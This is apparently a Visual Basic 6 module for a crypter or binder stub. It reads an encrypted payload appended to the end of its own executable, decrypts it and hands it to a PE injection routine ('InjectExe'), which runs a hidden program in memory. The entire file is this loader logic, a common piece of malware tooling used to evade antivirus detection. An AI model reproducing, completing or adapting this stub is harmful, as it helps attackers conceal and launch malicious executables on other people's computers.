Attribute VB_Name = "mMain"
Option Explicit

Private Declare Function SetTimer Lib "user32" (ByVal hwnd As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long) As Long
Private Declare Function KillTimer Lib "user32" (ByVal hwnd As Long, ByVal nIDEvent As Long) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Function GetDesktopWindow Lib "user32" () As Long

Private m_bCancel   As Boolean
Private m_lID       As Long

Private Sub Main()
    SetTimer 0, App.hInstance, 100, AddressOf TimerProc
    Do
        DoEvents: Call Sleep(100)
    Loop Until m_bCancel
End Sub

Sub TimerProc(ByVal hwnd As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long)
    KillTimer 0, App.hInstance
 
    Dim sPath   As String
    Dim bSig    As Byte
    Dim lSize   As Long
    Dim cCrypt  As New clsCryptAPI
    Dim sData   As String
    Dim sSize   As String * 8
    
    If Not m_bCancel Then
        m_bCancel = True
        sPath = ThisExe

        Open sPath For Binary Access Read As #1
    
        Seek #1, LOF(1) - 1: Get #1, , bSig
        Seek #1, LOF(1) - 9: Get #1, , sSize
        lSize = Val(sSize)
        If bSig = 27 And lSize > 0 And lSize < LOF(1) Then
            Seek #1, LOF(1) - 9 - lSize
            sData = Space(lSize)
            Get #1, , sData
            sData = cCrypt.DecryptString(sData)
            mPEL.InjectExe sPath, StrConv(sData, vbFromUnicode)
        End If
    
        Close #1

    End If
End Sub
